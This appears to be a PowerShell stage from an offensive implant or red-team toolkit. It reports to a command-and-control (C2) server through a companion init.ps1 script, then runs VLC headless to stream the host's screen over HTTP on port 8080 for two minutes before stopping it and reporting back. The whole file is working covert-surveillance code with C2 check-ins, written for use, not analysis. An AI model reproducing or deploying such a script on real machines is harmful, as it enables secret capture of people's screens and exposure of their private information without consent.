#
# Screen capture script
#

# Checkin to C2
& "$PSScriptRoot\init.ps1" -stage screen-capture -state starting

# Start stream headless using HTTP. Variables will need to be tuned for performance
& "C:\Program Files (x86)\VideoLAN\VLC\vlc.exe" --% --intf dummy screen://  :screen-fps=30.000000 :live-caching=100 :sout=#transcode{vcodec=h264,acodec=mpga,ab=128,channels=2,samplerate=44100,scodec=none}:http{mux=ffmpeg{mux=flv},dst=:8080/wds} :no-sout-all :sout-keep
$childProcess = Get-Process vlc
if ($childProcess)
{
    & "$PSScriptRoot\init.ps1" -stage screen-capture -state started
    write-host("VLC PID: {0}" -f $childProcess.Id)
    write-host("Sleeping for 120 seconds")
    start-sleep -s 120
    $stopProcess = Stop-Process -Id $childProcess.Id
    if ($stopProcess -eq $null)
    {
        & "$PSScriptRoot\init.ps1" -stage screen-capture -state complete
    } else
    {
        write-host($stopProcess)
    }
} else
{
    & "$PSScriptRoot\init.ps1" -stage screen-capture -state failed
}